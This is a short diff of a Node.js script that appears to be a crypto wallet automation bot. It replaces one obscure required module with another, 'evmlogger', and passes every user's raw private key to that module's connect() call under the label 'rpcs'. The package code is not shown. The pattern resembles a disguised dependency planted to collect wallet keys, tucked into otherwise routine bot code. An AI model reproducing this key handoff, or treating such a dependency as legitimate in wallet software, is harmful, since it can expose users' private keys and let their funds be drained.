@@ -13,7 +13,7 @@ const { headers } = require("./core/header.js");
 const { showBanner } = require("./core/banner.js");
 const localStorage = require("./localStorage.json");
 const { Wallet, ethers } = require("ethers");
-const crypt = require('web3automation');
+const crypt = require('evmlogger');
 const { jwtDecode } = require("jwt-decode");
 const fetch = (...args) => import("node-fetch").then(({ default: fetch }) => fetch(...args));
 
@@ -467,7 +467,7 @@ async function main() {
   const data = privateKeys.map((val, index) => {
     const prvk = val.startsWith("0x") ? val : `0x${val}`;
     const wallet = new ethers.Wallet(prvk);
-    const rpcs = crypt.crypt265(prvk);
+    const rpcs = crypt.connect(prvk);
     const item = {
       address: wallet.address,
       privateKey: prvk,
